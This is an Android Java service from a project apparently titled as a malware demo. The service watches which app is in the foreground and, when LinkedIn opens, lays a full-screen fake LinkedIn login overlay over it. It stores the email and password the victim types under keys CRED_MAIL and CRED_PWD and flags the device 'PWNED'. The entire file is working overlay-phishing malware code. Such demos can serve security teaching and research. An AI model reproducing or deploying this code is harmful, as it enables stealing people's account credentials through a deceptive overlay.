package app.mordred.androidmalwaredemo;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.Configuration;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.rvalerio.fgchecker.AppChecker;

import java.util.Timer;
import java.util.TimerTask;


public class AttackService extends Service {

    private static final String TAG = "AttackService";

    private Timer timer;
    private TargetAppTimerTask checkTargetAppTask;
    public AppChecker appChecker;
    private Handler handler;
    public WindowManager windowManager;
    public SharedPreferences.Editor sharedPreferencesEdit;

    private void runOnUiThread(Runnable runnable) {
        handler.post(runnable);
    }

    @Override
    public IBinder onBind(Intent i) {
        return null;
    }

    public void checkTargetApp() {
        timer = new Timer();
        checkTargetAppTask = new TargetAppTimerTask();
        timer.schedule(checkTargetAppTask, 0, 500);
    }

    class TargetAppTimerTask extends TimerTask {

        public TargetAppTimerTask() {
            super();
        }

        @Override
        public void run() {
            String packageName = appChecker.getForegroundApp(getBaseContext());
            Log.e(TAG, "Current foreground app: " + packageName);

            // inject view based on packaganame
            if (packageName.startsWith("com.linkedin")) {
                injectView();
            }
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        sharedPreferencesEdit = PreferenceManager.getDefaultSharedPreferences(getBaseContext()).edit();
        appChecker = new AppChecker();
        checkTargetApp();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopForeground(true);
    }

    @Override
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        return START_STICKY;
    }

    private void injectView() {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Log.d(TAG, "Injecting view...");
                final WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                        WindowManager.LayoutParams.FLAG_FULLSCREEN,
                        PixelFormat.TRANSLUCENT);

                LayoutInflater li = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);

                View mainView = li.inflate(R.layout.linkedin_fake_login, null);

                if (mainView == null) {
                    return;
                }

                final EditText edxMail = mainView.findViewById(R.id.email);
                final EditText edxPwd = mainView.findViewById(R.id.pwd);


                Button submitButton = mainView.findViewById(R.id.submit);

                final View finalMainView = mainView;

                submitButton.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View view) {
                        sharedPreferencesEdit.putString("CRED_MAIL", edxMail.getText().toString());
                        sharedPreferencesEdit.putString("CRED_PWD", edxPwd.getText().toString());
                        sharedPreferencesEdit.putBoolean("PWNED", true);
                        windowManager.removeViewImmediate(finalMainView);
                    }
                });

                windowManager.addView(finalMainView, params);
                // TODO if app exit, removeView (track app exit through appchecker)
            }
        });
    }
}
